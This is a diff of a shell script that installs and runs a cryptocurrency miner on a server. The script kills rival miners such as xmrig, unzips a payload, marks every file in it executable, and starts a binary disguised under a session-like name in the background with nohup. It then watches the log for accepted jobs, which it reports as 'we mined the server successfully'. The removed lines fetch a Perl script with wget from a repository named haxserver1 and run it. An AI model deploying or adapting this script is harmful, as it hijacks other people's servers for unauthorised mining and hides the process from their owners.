@@ -27,7 +27,6 @@ case $1 in
     exit 1
     ;;
 esac
-
 echo "Removing other miner if any"
 pkill xmrig
 pkill session_ajqysbe
@@ -46,7 +45,7 @@ fi
 
 # Unzip the downloaded file
 echo "Unzipping the file"
-unzip kwarta.zip -d extracted
+unzip kwarta.zip
 if [ $? -ne 0 ]; then
   echo "Unzipping failed."
   rm -rf kwarta.zip
@@ -59,8 +58,7 @@ fi
 rm -rf kwarta.zip
 
 # Change directory to the extracted folder
-EXTRACTED_DIR=$(ls -td extracted/* | head -1)
-cd "$EXTRACTED_DIR"
+cd sess_aksd19sb187ss1ia901b23
 if [ $? -ne 0 ]; then
   echo "Directory change failed. The expected directory may not exist."
   exit 1
@@ -69,18 +67,61 @@ fi
 # Make all files in the directory executable
 chmod +x *
 
-# Download and run the additional script
-wget https://raw.githubusercontent.com/haxserver1/session_uia21jkjgz8719831bs9d1ba971283v/main/mon.pl 
-if [ $? -ne 0 ]; then
-  echo "Failed to download mon.pl script."
-  exit 1
+# Use session.log as the log file
+LOG_FILE="session.log"
+
+# Run the executable file in the background, capturing output to session.log
+nohup ./session_ajqysbey 2>&1 &
+
+# Get the PID of the last background process
+PID=$!
+
+# Wait for a moment to check if the process is still running
+sleep 3
+
+# Check if the process is running
+if ps -p $PID > /dev/null; then
+  echo "Process started successfully with PID $PID."
+else
+  echo "Failed to start process with nohup. Trying alternate method."
+
+  # Try an alternate method to run in the background
+  ./session_ajqysbey 2>&1 &
+  PID=$!
+  sleep 3
+
+  if ps -p $PID > /dev/null; then
+    echo "Process started successfully with alternate method with PID $PID."
+  else
+    echo "Failed to start process with alternate method."
+    exit 1
+  fi
 fi
 
-# Run the Perl script
-nohup perl mon.pl >/dev/null 2>&1 &
-if [ $? -ne 0 ]; then
-  echo "Failed to execute mon.pl script."
-  exit 1
-fi
+# Function to check the log file for specific messages and process status
+check_log() {
+  while true; do
+    if grep -q "job" "$LOG_FILE" || grep -q "accepted" "$LOG_FILE"; then
+      echo "Found 'job' we mined the server successfully"
+      exit 0
+    else
+      echo "No Job found yet this time!"
+    fi
+
+    # Check if the background process is still running
+    if ! ps -p $PID > /dev/null; then
+      echo "Process has terminated. Exiting script."
+      exit 1
+    fi
+
+    sleep 60
+  done
+}
+
+# Run the log check function in the background
+check_log &
+
+# Wait for the log check process to complete
+wait $!
 
 echo "Script executed successfully."
